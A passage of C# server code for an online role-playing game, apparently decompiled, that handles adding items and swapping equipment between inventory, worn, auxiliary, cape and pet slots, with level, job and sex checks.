						数量 = 1;
					}
					num = 4;
					System.Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array3, 0, 8);
					num = 41;
					System.Buffer.BlockCopy(BitConverter.GetBytes(物品ID), 0, array3, 8, 4);
					num = 42;
					System.Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array3, 12, 4);
					num = 43;
					System.Buffer.BlockCopy(array, 0, array3, 16, array.Length);
					num = 5;
					if (使用天数 > 0)
					{
						DateTime value3 = new DateTime(1970, 1, 1, 8, 0, 0);
						System.Buffer.BlockCopy(BitConverter.GetBytes((int)DateTime.Now.Subtract(value3).TotalSeconds), 0, array3, 52, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes((int)DateTime.Now.AddDays(使用天数).Subtract(value3).TotalSeconds), 0, array3, 56, 4);
					}
					if (value.FLD_NJ > 0 && (value.FLD_RESIDE2 == 1 || value.FLD_RESIDE2 == 2 || value.FLD_RESIDE2 == 5 || value.FLD_RESIDE2 == 4 || value.FLD_RESIDE2 == 6))
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(1000), 0, array3, 60, 2);
					}
					装备栏包裹[位置].物品_byte = array3;
					num = 6;
					System.Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array2, 39, 2);
					System.Buffer.BlockCopy(array3, 0, array2, 14, 12);
					System.Buffer.BlockCopy(array3, 12, array2, 30, 4);
					System.Buffer.BlockCopy(array3, 16, array2, 46, array.Length);
					num = 7;
					if (绑定 == 1)
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array3, 72, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(物品ID + 20000), 0, array2, 22, 4);
					}
					else
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array3, 72, 1);
					}
					num = 8;
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array2, array2.Length);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "增加物品出错1 位置[" + num + "] [" + base.Userid + "][" + base.UserName + "]  位置[" + 位置 + "]  数量[" + 数量 + "]" + ex.Message);
			}
		}

		public void 更换装备(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (退出中)
				{
					Form1.WriteLine(6, "退出复制BUG  [" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "]  ");
				}
				else if (!打开仓库中 && (个人商店 == null || !个人商店.个人商店是否开启))
				{
					int num = 封包数据[10];
					int num2 = 封包数据[11];
					int num3 = 封包数据[12];
					int num4 = 封包数据[13];
					int num5 = BitConverter.ToInt32(封包数据, 14);
					if (num5 > 0 && num5 <= 9999)
					{
						byte[] 物品_byte = new byte[World.数据库单个物品大小];
						switch (num)
						{
						case 59:
							if (BitConverter.ToInt32(人物灵兽.宠物以装备[num2].物品ID, 0) != 0)
							{
								switch (num3)
								{
								case 60:
									if (num4 < 16)
									{
										if (BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品ID, 0) == 0)
										{
											if (BitConverter.ToInt32(人物灵兽.宠物以装备[num2].物品ID, 0) != 0)
											{
												人物灵兽.宠物装备栏[num4].物品_byte = 人物灵兽.宠物以装备[num2].物品_byte;
												人物灵兽.宠物以装备[num2].物品_byte = 物品_byte;
												更换装备位置(num, num2, num3, num4, 人物灵兽.宠物装备栏[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品数量, 0));
											}
										}
										else if (BitConverter.ToInt32(人物灵兽.宠物以装备[num2].物品ID, 0) != 0)
										{
											ItmeClass itmeClass = World.Itme[BitConverter.ToInt32(人物灵兽.宠物以装备[num2].物品ID, 0)];
											if (BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品ID, 0) != 0 && !人物灵兽.宠物装备栏[num4].锁定)
											{
												ItmeClass itmeClass2 = World.Itme[BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品ID, 0)];
												if (itmeClass.FLD_RESIDE2 == itmeClass2.FLD_RESIDE2 && itmeClass2.FLD_RESIDE2 >= 1 && itmeClass2.FLD_RESIDE2 <= 16)
												{
													byte[] 物品_byte4 = 人物灵兽.宠物装备栏[num4].物品_byte;
													人物灵兽.宠物装备栏[num4].物品_byte = 人物灵兽.宠物以装备[num2].物品_byte;
													装备栏已穿装备[num2].物品_byte = 物品_byte4;
													更换装备位置(num, num2, num3, num4, 人物灵兽.宠物装备栏[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品数量, 0));
												}
											}
										}
									}
									break;
								case 59:
									if (BitConverter.ToInt32(人物灵兽.宠物以装备[num4].物品ID, 0) == 0)
									{
										人物灵兽.宠物以装备[num4].物品_byte = 人物灵兽.宠物装备栏[num2].物品_byte;
										人物灵兽.宠物装备栏[num2].物品_byte = 物品_byte;
										更换装备位置(num, num2, num3, num4, 人物灵兽.宠物以装备[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物以装备[num4].物品数量, 0));
									}
									else
									{
										byte[] 物品_byte5 = 人物灵兽.宠物以装备[num4].物品_byte;
										人物灵兽.宠物以装备[num4].物品_byte = 人物灵兽.宠物装备栏[num2].物品_byte;
										人物灵兽.宠物装备栏[num2].物品_byte = 物品_byte5;
										更换装备位置(num, num2, num3, num4, 人物灵兽.宠物以装备[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物以装备[num4].物品数量, 0));
									}
									break;
								case 1:
									if (!人物灵兽.宠物装备栏[num2].物品绑定)
									{
										if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
										{
											装备栏包裹[num4].物品_byte = 人物灵兽.宠物装备栏[num2].物品_byte;
											人物灵兽.宠物装备栏[num2].物品_byte = 物品_byte;
											更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
										}
										else
										{
											byte[] 物品_byte3 = 装备栏包裹[num4].物品_byte;
											装备栏包裹[num4].物品_byte = 人物灵兽.宠物装备栏[num2].物品_byte;
											人物灵兽.宠物装备栏[num2].物品_byte = 物品_byte3;
											更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
										}
										更新金钱和负重();
									}
									break;
								}
							}
							break;
						case 1:
						{
							物品类 物品类2 = 装备栏包裹[num2];
							if (BitConverter.ToInt32(物品类2.物品ID, 0) != 0)
							{
								switch (num3)
								{
								case 1:
									if (!装备栏包裹[num2].锁定 && num5 == 装备栏包裹[num2].Get物品数量 && BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 0)
									{
										ItmeClass itmeClass11 = World.Itme[BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0)];
										if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
										{
											装备栏包裹[num4].物品_byte = 装备栏包裹[num2].物品_byte;
											装备栏包裹[num2].物品_byte = 物品_byte;
											更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
										}
										else
										{
											ItmeClass itmeClass12 = World.Itme[BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0)];
											if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) != BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) || (itmeClass12.FLD_SIDE != 1 && itmeClass11.FLD_SIDE != 1))
											{
												byte[] 物品_byte12 = 装备栏包裹[num4].物品_byte;
												装备栏包裹[num4].物品_byte = 装备栏包裹[num2].物品_byte;
												装备栏包裹[num2].物品_byte = 物品_byte12;
												更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
											}
										}
									}
									break;
								case 0:
									if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 0 && num5 == 装备栏包裹[num2].Get物品数量 && !装备栏包裹[num2].锁定)
									{
										ItmeClass itmeClass15 = World.Itme[BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0)];
										if (itmeClass15.FLD_LEVEL <= base.Player_Level && (base.Player_Job != 11 || (itmeClass15.FLD_RESIDE2 != 7 && itmeClass15.FLD_RESIDE2 != 8 && itmeClass15.FLD_RESIDE2 != 10) || base.Player_Job == itmeClass15.FLD_RESIDE1) && (itmeClass15.FLD_ZX == 0 || itmeClass15.FLD_ZX == base.Player_Zx))
										{
											if (itmeClass15.FLD_RESIDE1 != 0)
											{
												if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) == 1000000148)
												{
													if (base.Player_Job != 11 && base.Player_Job != 4)
													{
														break;
													}
												}
												else if (itmeClass15.FLD_RESIDE1 != base.Player_Job)
												{
													break;
												}
											}
											if ((itmeClass15.FLD_JOB_LEVEL == 0 || itmeClass15.FLD_JOB_LEVEL <= base.Player_Job_leve) && (itmeClass15.FLD_SEX == 0 || itmeClass15.FLD_SEX == base.Player_Sex) && itmeClass15.FLD_RESIDE2 >= 1 && itmeClass15.FLD_RESIDE2 <= 16 && (itmeClass15.FLD_XWJD < 1 || itmeClass15.FLD_XWJD <= base.武勋阶段) && (num4 != 14 || 人物灵兽 == null))
											{
												if (BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0) == 0)
												{
													if (itmeClass15.FLD_RESIDE2 != num4 + 1 && ((itmeClass15.FLD_RESIDE2 != 2 && itmeClass15.FLD_RESIDE2 != 3 && itmeClass15.FLD_RESIDE2 != 8 && itmeClass15.FLD_RESIDE2 != 9 && itmeClass15.FLD_RESIDE2 != 10 && itmeClass15.FLD_RESIDE2 != 11) || itmeClass15.FLD_RESIDE2 != num4))
													{
														break;
													}
													装备栏已穿装备[num4].物品_byte = 装备栏包裹[num2].物品_byte;
													装备栏包裹[num2].物品_byte = 物品_byte;
													更换装备位置(num, num2, num3, num4, 装备栏已穿装备[num4].物品_byte, BitConverter.ToInt32(装备栏已穿装备[num4].物品数量, 0));
												}
												else
												{
													if (BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0) == 0)
													{
														break;
													}
													ItmeClass itmeClass16 = World.Itme[BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0)];
													if (itmeClass15.FLD_RESIDE2 != itmeClass16.FLD_RESIDE2)
													{
														break;
													}
													byte[] 物品_byte14 = 装备栏已穿装备[num4].物品_byte;
													装备栏已穿装备[num4].物品_byte = 装备栏包裹[num2].物品_byte;
													装备栏包裹[num2].物品_byte = 物品_byte14;
													更换装备位置(num, num2, num3, num4, 装备栏已穿装备[num4].物品_byte, BitConverter.ToInt32(装备栏已穿装备[num4].物品数量, 0));
												}
												更新人物数据(this);
												更新广播人物数据();
												更新装备效果();
												计算人物装备数据();
												更新武功和状态();
												更新金钱和负重();
												更新HP_MP_SP();
											}
										}
									}
									break;
								case 169:
								{
									ItmeClass value;
									if (!装备栏包裹[num2].锁定 && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value) && value.FLD_RESIDE2 == 12 && BitConverter.ToInt32(披风行囊[num4].物品ID, 0) == 0)
									{
										披风行囊[num4].物品_byte = 装备栏包裹[num2].物品_byte;
										装备栏包裹[num2].物品_byte = 物品_byte;
										更换装备位置(num, num2, num3, num4, 披风行囊[num4].物品_byte, BitConverter.ToInt32(披风行囊[num4].物品数量, 0));
									}
									break;
								}
								case 123:
									if (BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0) != 0 && !装备栏包裹[num2].锁定)
									{
										ItmeClass itmeClass13 = World.Itme[BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0)];
										if (itmeClass13.FLD_LEVEL <= base.Player_Level && (itmeClass13.FLD_ZX == 0 || itmeClass13.FLD_ZX == base.Player_Zx))
										{
											if (itmeClass13.FLD_RESIDE1 != 0)
											{
												if (base.Player_Job != 1 && base.Player_Job != 8)
												{
													if (itmeClass13.FLD_RESIDE1 != base.Player_Job)
													{
														break;
													}
												}
												else if (itmeClass13.FLD_RESIDE1 != base.Player_Job && itmeClass13.FLD_RESIDE1 != 9)
												{
													break;
												}
											}
											if ((itmeClass13.FLD_JOB_LEVEL == 0 || itmeClass13.FLD_JOB_LEVEL <= base.Player_Job_leve) && (itmeClass13.FLD_SEX == 0 || itmeClass13.FLD_SEX == base.Player_Sex) && itmeClass13.FLD_RESIDE2 >= 1 && itmeClass13.FLD_RESIDE2 <= 16 && (itmeClass13.FLD_XWJD < 1 || itmeClass13.FLD_XWJD <= base.武勋阶段) && (num4 != 14 || 人物灵兽 == null))
											{
												if (BitConverter.ToInt32(辅助装备栏装备[num4].物品ID, 0) == 0)
												{
													if (itmeClass13.FLD_RESIDE2 != num4 + 1 && ((itmeClass13.FLD_RESIDE2 != 2 && itmeClass13.FLD_RESIDE2 != 3 && itmeClass13.FLD_RESIDE2 != 8 && itmeClass13.FLD_RESIDE2 != 9 && itmeClass13.FLD_RESIDE2 != 10 && itmeClass13.FLD_RESIDE2 != 11) || itmeClass13.FLD_RESIDE2 != num4))
													{
														break;
													}
													辅助装备栏装备[num4].物品_byte = 装备栏包裹[num2].物品_byte;
													装备栏包裹[num2].物品_byte = 物品_byte;
													更换装备位置(num, num2, num3, num4, 辅助装备栏装备[num4].物品_byte, BitConverter.ToInt32(辅助装备栏装备[num4].物品数量, 0));
												}
												else
												{
													if (BitConverter.ToInt32(辅助装备栏装备[num4].物品ID, 0) == 0)
													{
														break;
													}
													ItmeClass itmeClass14 = World.Itme[BitConverter.ToInt32(辅助装备栏装备[num4].物品ID, 0)];
													if (itmeClass13.FLD_RESIDE2 != itmeClass14.FLD_RESIDE2)
													{
														break;
													}
													byte[] 物品_byte13 = 辅助装备栏装备[num4].物品_byte;
													辅助装备栏装备[num4].物品_byte = 装备栏包裹[num2].物品_byte;
													装备栏包裹[num2].物品_byte = 物品_byte13;
													更换装备位置(num, num2, num3, num4, 辅助装备栏装备[num4].物品_byte, BitConverter.ToInt32(辅助装备栏装备[num4].物品数量, 0));
												}
												更新人物数据(this);
												更新广播人物数据();
												更新装备效果();
												计算人物装备数据();
												更新武功和状态();
												更新金钱和负重();
												更新HP_MP_SP();
											}
										}
									}
									break;
								case 60:
									if (!装备栏包裹[num2].物品绑定 && (BitConverter.ToInt32(物品类2.物品ID, 0) == 601100001 || BitConverter.ToInt32(物品类2.物品ID, 0) == 601100002 || BitConverter.ToInt32(物品类2.物品ID, 0) == 601100003 || BitConverter.ToInt32(物品类2.物品ID, 0) == 601100004 || BitConverter.ToInt32(物品类2.物品ID, 0) == 601100005 || BitConverter.ToInt32(物品类2.物品ID, 0) == 601100006 || BitConverter.ToInt32(物品类2.物品ID, 0) == 601100007))
									{
										if (BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品ID, 0) == 0)
										{
											if (人物灵兽.FLD_JOB_LEVEL == 1)
											{
												if (num4 > 8)
												{
													break;
												}
											}
											else if (人物灵兽.FLD_JOB_LEVEL == 2)
											{
												if (num4 > 12)
												{
													break;
												}
											}
											else if (人物灵兽.FLD_JOB_LEVEL == 3)
											{
												if (num4 > 16)
												{
													break;
												}
											}
											else if (num4 > 4)
											{
												break;
											}
											人物灵兽.宠物装备栏[num4].物品_byte = 装备栏包裹[num2].物品_byte;
											装备栏包裹[num2].物品_byte = 物品_byte;
											更换装备位置(num, num2, num3, num4, 人物灵兽.宠物装备栏[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品数量, 0));
										}
										else
										{
											byte[] 物品_byte11 = 人物灵兽.宠物装备栏[num4].物品_byte;
											人物灵兽.宠物装备栏[num4].物品_byte = 装备栏包裹[num2].物品_byte;
											装备栏包裹[num2].物品_byte = 物品_byte11;
											更换装备位置(num, num2, num3, num4, 人物灵兽.宠物装备栏[num4].物品_byte, BitConverter.ToInt32(人物灵兽.宠物装备栏[num4].物品数量, 0));
										}
										更新灵兽负重();
									}
									break;
								}
							}
							break;
						}
						case 0:
						{
							物品类 物品类 = 装备栏已穿装备[num2];
							if (BitConverter.ToInt32(物品类.物品ID, 0) != 0 && !物品类.锁定)
							{
								switch (num3)
								{
								case 169:
								{
									if (装备栏已穿装备[num2].锁定 || BitConverter.ToInt32(装备栏已穿装备[num2].物品ID, 0) == 0 || 装备栏已穿装备[num2].锁定)
									{
										return;
									}
									ItmeClass itmeClass7 = World.Itme[BitConverter.ToInt32(装备栏已穿装备[num2].物品ID, 0)];
									if ((itmeClass7.FLD_SEX != 0 && itmeClass7.FLD_SEX != base.Player_Sex) || itmeClass7.FLD_RESIDE2 != 12)
									{
										return;
									}
									if (BitConverter.ToInt32(披风行囊[num4].物品ID, 0) == 0)
									{
										披风行囊[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
										装备栏已穿装备[num2].物品_byte = 物品_byte;
										更换装备位置(num, num2, num3, num4, 披风行囊[num4].物品_byte, BitConverter.ToInt32(披风行囊[num4].物品数量, 0));
									}
									else
									{
										ItmeClass itmeClass8 = World.Itme[BitConverter.ToInt32(披风行囊[num4].物品ID, 0)];
										if (itmeClass7.FLD_RESIDE2 != itmeClass8.FLD_RESIDE2)
										{
											return;
										}
										byte[] 物品_byte8 = 披风行囊[num4].物品_byte;
										披风行囊[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
										装备栏已穿装备[num2].物品_byte = 物品_byte8;
										更换装备位置(num, num2, num3, num4, 披风行囊[num4].物品_byte, BitConverter.ToInt32(披风行囊[num4].物品数量, 0));
									}
									break;
								}
								case 1:
									if (num4 >= World.装备最大数 || (num2 == 14 && 人物灵兽 != null) || num5 != 装备栏已穿装备[num2].Get物品数量)
									{
										return;
									}
									if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
									{
										if (BitConverter.ToInt32(装备栏已穿装备[num2].物品ID, 0) == 0)
										{
											return;
										}
										装备栏包裹[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
										装备栏已穿装备[num2].物品_byte = 物品_byte;
										更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
									}
									else
									{
										if (BitConverter.ToInt32(装备栏已穿装备[num2].物品ID, 0) == 0)
										{
											return;
										}
										ItmeClass itmeClass5 = World.Itme[BitConverter.ToInt32(装备栏已穿装备[num2].物品ID, 0)];
										if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0 || 装备栏包裹[num4].锁定)
										{
											return;
										}
										ItmeClass itmeClass6 = World.Itme[BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0)];
										if (itmeClass5.FLD_RESIDE2 != itmeClass6.FLD_RESIDE2 || itmeClass6.FLD_LEVEL > base.Player_Level || (itmeClass6.FLD_ZX != 0 && itmeClass6.FLD_ZX != base.Player_Zx))
										{
											return;
										}
										if (itmeClass6.FLD_RESIDE1 != 0)
										{
											if (base.Player_Job != 1 && base.Player_Job != 8)
											{
												if (itmeClass6.FLD_RESIDE1 != base.Player_Job)
												{
													return;
												}
											}
											else if (itmeClass6.FLD_RESIDE1 != base.Player_Job && itmeClass6.FLD_RESIDE1 != 10)
											{
												return;
											}
										}
										if ((itmeClass6.FLD_JOB_LEVEL != 0 && itmeClass6.FLD_JOB_LEVEL > base.Player_Job_leve) || (itmeClass6.FLD_SEX != 0 && itmeClass6.FLD_SEX != base.Player_Sex) || (itmeClass6.FLD_XWJD >= 1 && itmeClass6.FLD_XWJD > base.武勋阶段) || itmeClass6.FLD_RESIDE2 < 1 || itmeClass6.FLD_RESIDE2 > 16)
										{
											return;
										}
										byte[] 物品_byte7 = 装备栏包裹[num4].物品_byte;
										装备栏包裹[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
										装备栏已穿装备[num2].物品_byte = 物品_byte7;
										更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
									}
									break;
								case 0:
								{
									if (num2 == 14 && 人物灵兽 != null)
									{
										return;
									}
									ItmeClass itmeClass3 = World.Itme[BitConverter.ToInt32(装备栏已穿装备[num2].物品ID, 0)];
									if (itmeClass3.FLD_LEVEL > base.Player_Level || (itmeClass3.FLD_ZX != 0 && itmeClass3.FLD_ZX != base.Player_Zx))
									{
										return;
									}
									if (itmeClass3.FLD_RESIDE1 != 0)
									{
										if (base.Player_Job != 1 && base.Player_Job != 8)
										{
											if (itmeClass3.FLD_RESIDE1 != base.Player_Job)
											{
												return;
											}
										}
										else if (itmeClass3.FLD_RESIDE1 != base.Player_Job && itmeClass3.FLD_RESIDE1 != 10)
										{
											return;
										}
									}
									if ((itmeClass3.FLD_JOB_LEVEL != 0 && itmeClass3.FLD_JOB_LEVEL > base.Player_Job_leve) || (itmeClass3.FLD_SEX != 0 && itmeClass3.FLD_SEX != base.Player_Sex) || (itmeClass3.FLD_XWJD >= 1 && itmeClass3.FLD_XWJD > base.武勋阶段) || itmeClass3.FLD_RESIDE2 < 1 || itmeClass3.FLD_RESIDE2 > 16)
									{
										return;
									}
									if (BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0) == 0)
									{
										if (itmeClass3.FLD_RESIDE2 != num4 + 1 && ((itmeClass3.FLD_RESIDE2 != 2 && itmeClass3.FLD_RESIDE2 != 3 && itmeClass3.FLD_RESIDE2 != 8 && itmeClass3.FLD_RESIDE2 != 9 && itmeClass3.FLD_RESIDE2 != 10 && itmeClass3.FLD_RESIDE2 != 11) || itmeClass3.FLD_RESIDE2 != num4))
										{
											return;
										}
										装备栏已穿装备[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
										装备栏已穿装备[num2].物品_byte = 物品_byte;
										更换装备位置(num, num2, num3, num4, 装备栏已穿装备[num4].物品_byte, BitConverter.ToInt32(装备栏已穿装备[num4].物品数量, 0));
									}
									else
									{
										if (BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0) == 0)
										{
											return;
										}
										ItmeClass itmeClass4 = World.Itme[BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0)];
										if (itmeClass3.FLD_RESIDE2 != itmeClass4.FLD_RESIDE2)
										{
											return;
										}
										byte[] 物品_byte6 = 装备栏已穿装备[num4].物品_byte;
										装备栏已穿装备[num4].物品_byte = 装备栏已穿装备[num2].物品_byte;
										装备栏已穿装备[num2].物品_byte = 物品_byte6;
										更换装备位置(num, num2, num3, num4, 装备栏已穿装备[num4].物品_byte, BitConverter.ToInt32(装备栏已穿装备[num4].物品数量, 0));
									}
									break;
								}
								}
								更新人物数据(this);
								更新广播人物数据();
								更新装备效果();
								计算人物装备数据();
								更新武功和状态();
								更新金钱和负重();
								更新HP_MP_SP();
							}
							break;
						}
						case 169:
							if (!披风行囊[num2].锁定 && BitConverter.ToInt32(披风行囊[num2].物品ID, 0) != 0)
							{
								switch (num3)
								{
								case 169:
									if (!披风行囊[num2].锁定)
									{
										if (BitConverter.ToInt32(披风行囊[num4].物品ID, 0) == 0)
										{
											披风行囊[num4].物品_byte = 披风行囊[num2].物品_byte;
											披风行囊[num2].物品_byte = 物品_byte;
											更换装备位置(num, num2, num3, num4, 披风行囊[num4].物品_byte, BitConverter.ToInt32(披风行囊[num4].物品数量, 0));
										}
										else
										{
											byte[] 物品_byte10 = 披风行囊[num4].物品_byte;
											披风行囊[num4].物品_byte = 披风行囊[num2].物品_byte;
											披风行囊[num2].物品_byte = 物品_byte10;
											更换装备位置(num, num2, num3, num4, 披风行囊[num4].物品_byte, BitConverter.ToInt32(披风行囊[num4].物品数量, 0));
										}
									}
									break;
								case 1:
									if (base.Player_Money < 1000000L)
									{
										系统提示("你真穷，100万都没有。");
									}
									else
									{
										base.Player_Money -= 1000000L;
										if (BitConverter.ToInt32(披风行囊[num2].物品ID, 0) != 0 && !披风行囊[num2].锁定 && BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
										{
											装备栏包裹[num4].物品_byte = 披风行囊[num2].物品_byte;
											披风行囊[num2].物品_byte = 物品_byte;
											更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
										}
									}
									break;
								case 0:
									if (BitConverter.ToInt32(披风行囊[num2].物品ID, 0) != 0 && !披风行囊[num2].锁定)
									{
										ItmeClass itmeClass9 = World.Itme[BitConverter.ToInt32(披风行囊[num2].物品ID, 0)];
										if ((itmeClass9.FLD_SEX == 0 || itmeClass9.FLD_SEX == base.Player_Sex) && itmeClass9.FLD_RESIDE2 == 12)
										{
											if (BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0) == 0)
											{
												if (base.Player_Money < 1000000L)
												{
													系统提示("你真穷，100万都没有。");
													break;
												}
												base.Player_Money -= 1000000L;
												if (itmeClass9.FLD_RESIDE2 != num4 + 1 && ((itmeClass9.FLD_RESIDE2 != 2 && itmeClass9.FLD_RESIDE2 != 3 && itmeClass9.FLD_RESIDE2 != 8 && itmeClass9.FLD_RESIDE2 != 9 && itmeClass9.FLD_RESIDE2 != 10 && itmeClass9.FLD_RESIDE2 != 11) || itmeClass9.FLD_RESIDE2 != num4))
												{
													break;
												}
												装备栏已穿装备[num4].物品_byte = 披风行囊[num2].物品_byte;
												披风行囊[num2].物品_byte = 物品_byte;
												更换装备位置(num, num2, num3, num4, 装备栏已穿装备[num4].物品_byte, BitConverter.ToInt32(装备栏已穿装备[num4].物品数量, 0));
											}
											else
											{
												if (BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0) == 0)
												{
													break;
												}
												ItmeClass itmeClass10 = World.Itme[BitConverter.ToInt32(装备栏已穿装备[num4].物品ID, 0)];
												if (itmeClass9.FLD_RESIDE2 != itmeClass10.FLD_RESIDE2)
												{
													break;
												}
												byte[] 物品_byte9 = 装备栏已穿装备[num4].物品_byte;
												装备栏已穿装备[num4].物品_byte = 披风行囊[num2].物品_byte;
												披风行囊[num2].物品_byte = 物品_byte9;
												更换装备位置(num, num2, num3, num4, 装备栏已穿装备[num4].物品_byte, BitConverter.ToInt32(装备栏已穿装备[num4].物品数量, 0));
											}
											更新人物数据(this);
											更新装备效果();
											计算人物装备数据();
											更新武功和状态();
											更新HP_MP_SP();
										}
									}
									break;
								}
							}
							break;
						case 123:
						{
							物品类 物品类3 = 辅助装备栏装备[num2];
							if (BitConverter.ToInt32(物品类3.物品ID, 0) != 0 && !物品类3.锁定)
							{
								switch (num3)
								{
								case 1:
									if (num4 >= World.装备最大数 || (num2 == 14 && 人物灵兽 != null))
									{
										return;
									}
									if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0)
									{
										if (BitConverter.ToInt32(辅助装备栏装备[num2].物品ID, 0) == 0)
										{
											return;
										}
										装备栏包裹[num4].物品_byte = 辅助装备栏装备[num2].物品_byte;
										辅助装备栏装备[num2].物品_byte = 物品_byte;
										更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
									}
									else
									{
										if (BitConverter.ToInt32(辅助装备栏装备[num2].物品ID, 0) == 0)
										{
											return;
										}
										ItmeClass itmeClass19 = World.Itme[BitConverter.ToInt32(辅助装备栏装备[num2].物品ID, 0)];
										if (BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0) == 0 || 装备栏包裹[num4].锁定)
										{
											return;
										}
										ItmeClass itmeClass20 = World.Itme[BitConverter.ToInt32(装备栏包裹[num4].物品ID, 0)];
										if (itmeClass19.FLD_RESIDE2 != itmeClass20.FLD_RESIDE2 || itmeClass20.FLD_LEVEL > base.Player_Level || (itmeClass20.FLD_ZX != 0 && itmeClass20.FLD_ZX != base.Player_Zx))
										{
											return;
										}
										if (itmeClass20.FLD_RESIDE1 != 0)
										{
											if (base.Player_Job != 1 && base.Player_Job != 8)
											{
												if (itmeClass20.FLD_RESIDE1 != base.Player_Job)
												{
													return;
												}
											}
											else if (itmeClass20.FLD_RESIDE1 != base.Player_Job && itmeClass20.FLD_RESIDE1 != 10)
											{
												return;
											}
										}
										if ((itmeClass20.FLD_JOB_LEVEL != 0 && itmeClass20.FLD_JOB_LEVEL > base.Player_Job_leve) || (itmeClass20.FLD_SEX != 0 && itmeClass20.FLD_SEX != base.Player_Sex) || (itmeClass20.FLD_XWJD >= 1 && itmeClass20.FLD_XWJD > base.武勋阶段) || itmeClass20.FLD_RESIDE2 < 1 || itmeClass20.FLD_RESIDE2 > 16)
										{
											return;
										}
										byte[] 物品_byte16 = 装备栏包裹[num4].物品_byte;
										装备栏包裹[num4].物品_byte = 辅助装备栏装备[num2].物品_byte;
										辅助装备栏装备[num2].物品_byte = 物品_byte16;
										更换装备位置(num, num2, num3, num4, 装备栏包裹[num4].物品_byte, BitConverter.ToInt32(装备栏包裹[num4].物品数量, 0));
									}
									break;
								case 0:
								{
									if (num2 == 14 && 人物灵兽 != null)
									{
										return;
									}
									ItmeClass itmeClass17 = World.Itme[BitConverter.ToInt32(辅助装备栏装备[num2].物品ID, 0)];
									if (itmeClass17.FLD_LEVEL > base.Player_Level || (itmeClass17.FLD_ZX != 0 && itmeClass17.FLD_ZX != base.Player_Zx))
									{
										return;
									}
									if (itmeClass17.FLD_RESIDE1 != 0)
									{
										if (base.Player_Job != 1 && base.Player_Job != 8)
										{
											if (itmeClass17.FLD_RESIDE1 != base.Player_Job)
											{
												return;
											}
										}
										else if (itmeClass17.FLD_RESIDE1 != base.Player_Job && itmeClass17.FLD_RESIDE1 != 10)
										{
											return;
										}
									}
